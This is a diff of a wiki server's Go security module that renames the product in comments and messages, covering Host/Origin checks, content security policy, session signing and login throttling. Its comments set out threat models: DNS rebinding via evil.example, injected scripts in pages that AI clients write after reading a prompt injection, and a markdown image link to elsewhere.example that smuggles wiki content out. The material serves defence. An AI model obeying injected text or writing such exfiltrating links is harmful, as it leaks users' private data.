@@ -1,4 +1,4 @@
-// How Zone protects the wiki (docs/spec/security.md): the Host and Origin
+// How Zonewiki protects the wiki (docs/spec/security.md): the Host and Origin
 // checks, the login gate and its session cookie, the page policy, and the
 // throttle on wrong passwords and MCP tokens.
 package main
@@ -31,13 +31,13 @@ import (
 var now = time.Now
 
 // DNS rebinding: a page on evil.example whose name later resolves to
-// 127.0.0.1 reaches Zone with "Host: evil.example". Only localhost, and the
+// 127.0.0.1 reaches Zonewiki with "Host: evil.example". Only localhost, and the
 // names in the hosts setting (a reverse proxy's public name), get in, at
 // any port (--addr). ZONE_ALLOW_REMOTE without hosts lets in any IP
 // address too (LAN access by IP, nothing to set up): rebinding needs a
 // name its attacker controls, and an address can't be rebound; nor can a
 // name in .internal, which is never handed out (an assistant in a
-// container reaches Zone as host.containers.internal). Any other name
+// container reaches Zonewiki as host.containers.internal). Any other name
 // (nas.local, the machine's) then goes in hosts; the refusal says so.
 var allowedHosts = map[string]bool{"localhost": true, "127.0.0.1": true, "[::1]": true}
 
@@ -62,10 +62,10 @@ func hostRefused(w http.ResponseWriter, host string) {
 	refusedHosts.Lock()
 	if !refusedHosts.seen[name] && len(refusedHosts.seen) < hostsLogMax {
 		refusedHosts.seen[name] = true
-		logf("refused a request for host %q: if Zone is reached by that name, add it to hosts in .zone/config (zonewiki config set hosts %s, with the names it has, comma-separated)", name, name)
+		logf("refused a request for host %q: if Zonewiki is reached by that name, add it to hosts in .zone/config (zonewiki config set hosts %s, with the names it has, comma-separated)", name, name)
 	}
 	refusedHosts.Unlock()
-	http.Error(w, "Bad Request: Zone isn't reached by the name "+strconv.Quote(name)+
+	http.Error(w, "Bad Request: Zonewiki isn't reached by the name "+strconv.Quote(name)+
 		". If it is this wiki's, an admin adds it to hosts in the wiki's settings file (zonewiki config set hosts …).", http.StatusBadRequest)
 }
 
@@ -81,7 +81,7 @@ var refusedHosts = struct {
 // API, which takes text/plain bodies without a CORS preflight), and the Host
 // check passes because the Host really is localhost. Browsers send Origin on
 // every cross-site POST, so a write whose Origin names another site, or is
-// "null" (a sandboxed iframe), is refused. Zone's own forms, fetches and the
+// "null" (a sandboxed iframe), is refused. Zonewiki's own forms, fetches and the
 // pagehide beacon are same-origin; tools like curl send no Origin.
 func crossSite(r *http.Request) bool {
 	switch r.Method {
@@ -103,7 +103,7 @@ func crossSite(r *http.Request) bool {
 
 // isPing: the request is a link's ping (hyperlink auditing: a POST the
 // browser sends, same-origin and with the session's cookie, to each URL in
-// an <a ping=…> that is followed), which Zone answers with nothing. The
+// an <a ping=…> that is followed), which Zonewiki answers with nothing. The
 // render renames the attribute in a page's raw HTML (pingRE); this holds
 // for one that gets past it. Browsers mark a ping by its headers and type.
 func isPing(r *http.Request) bool {
@@ -118,7 +118,7 @@ func isPing(r *http.Request) bool {
 // pages are also written by AI clients (MCP), which may have read a prompt
 // injection: a <script>, an onerror= or a javascript: link in a page would
 // run with the user's session and could read and rewrite the whole wiki. So
-// only Zone's own script files run (script-src 'self'; Zone has no inline
+// only Zonewiki's own script files run (script-src 'self'; Zonewiki has no inline
 // scripts or handlers), no plugins, no <base> that re-points those files, no
 // form that posts elsewhere.
 //
@@ -127,19 +127,19 @@ func isPing(r *http.Request) bool {
 // so a way to send the wiki away without any script: an assistant told to
 // (by text it read) writes ![](https://elsewhere.example/?what-it-read)
 // and the reader's browser delivers it; a frame from elsewhere shows a
-// sign-in form that isn't Zone's. So everything comes from Zone itself
+// sign-in form that isn't Zonewiki's. So everything comes from Zonewiki itself
 // (default-src 'self'), images, media and fonts also from data: (pasted
 // in), styles also inline (a page's own, KaTeX's, Mermaid's: they load
 // nothing, as their url()s are images). The external-content setting names
 // hosts images, media and frames may come from all the same ("*": any,
 // as before). Links stay: following one is the reader's doing.
 //
-// Clickjacking: a site could load Zone invisibly in a frame and trick a
-// signed-in user into clicking Delete or Commit; and so could one of Zone's
+// Clickjacking: a site could load Zonewiki invisibly in a frame and trick a
+// signed-in user into clicking Delete or Commit; and so could one of Zonewiki's
 // own pages, whose raw HTML may hold an <iframe> and inline styles (a
-// transparent /admin or /changes over a decoy). So no response of Zone's
+// transparent /admin or /changes over a decoy). So no response of Zonewiki's
 // may be framed (frame-ancestors 'none'), but an upload, which a page may
-// show in an <iframe> (a PDF): it marks itself framable by Zone
+// show in an <iframe> (a PDF): it marks itself framable by Zonewiki
 // (frameableBySelf). A response with its own policy (an SVG upload's)
 // keeps it and gets only frame-ancestors added.
 func pageCSP(s *Settings) string {
@@ -153,7 +153,7 @@ func pageCSP(s *Settings) string {
 		"object-src 'none'; base-uri 'self'; form-action 'self'"
 }
 
-// frameableBySelf: the response may be framed by Zone's own pages (an
+// frameableBySelf: the response may be framed by Zonewiki's own pages (an
 // upload's, shown in a page's <iframe>); contentPolicy reads the mark.
 func frameableBySelf(h http.Header) { h.Set("X-Frame-Options", "SAMEORIGIN") }
 
@@ -213,16 +213,16 @@ func contentPolicy(h http.Header) {
 	}
 }
 
-// isHTTPS: the browser's connection is HTTPS, Zone's own (rare) or a
+// isHTTPS: the browser's connection is HTTPS, Zonewiki's own (rare) or a
 // reverse proxy's, which says so in X-Forwarded-Proto.
 func isHTTPS(r *http.Request) bool {
 	proto, _, _ := strings.Cut(r.Header.Get("X-Forwarded-Proto"), ",")
 	return r.TLS != nil || strings.ToLower(strings.TrimSpace(proto)) == "https"
 }
 
-// secretKey signs session cookies: one Zone made once and keeps in
+// secretKey signs session cookies: one Zonewiki made once and keeps in
 // .zone/secret_key in the wiki folder (owner-only, kept out of git), so a
-// restart doesn't sign everyone out. A wiki folder Zone can't write to gets
+// restart doesn't sign everyone out. A wiki folder Zonewiki can't write to gets
 // a new key per start.
 func secretKey(dataDir string) []byte {
 	path := filepath.Join(stateDirIn(dataDir), "secret_key")
@@ -285,7 +285,7 @@ func sign(payload string) string {
 	return base64.RawURLEncoding.EncodeToString(m.Sum(nil))
 }
 
-// readSession: the session of the request's cookie, if Zone signed it. A
+// readSession: the session of the request's cookie, if Zonewiki signed it. A
 // session without an id is none: it couldn't be signed out.
 func readSession(r *http.Request) (s session, ok bool) {
 	c, err := r.Cookie(sessionCookie)
@@ -390,7 +390,7 @@ func withAsker(r *http.Request, user asker, via string) *http.Request {
 	return r.WithContext(ctx)
 }
 
-// userOf: who asks with the request r (r nil: Zone itself).
+// userOf: who asks with the request r (r nil: Zonewiki itself).
 func userOf(r *http.Request) asker {
 	if r == nil {
 		return asker{}
@@ -531,7 +531,7 @@ func untrustedForwarder(peer netip.Addr) {
 		return
 	}
 	forwarders.seen[peer] = true
-	logf("requests from %s carry X-Forwarded-For, which Zone ignores from it: if %s is your reverse proxy, "+
+	logf("requests from %s carry X-Forwarded-For, which Zonewiki ignores from it: if %s is your reverse proxy, "+
 		"add it to trusted-proxies in %s (zonewiki config set trusted-proxies %s), so its clients are told apart "+
 		"when wrong passwords are throttled", peer, peer, configName(), peer)
 }
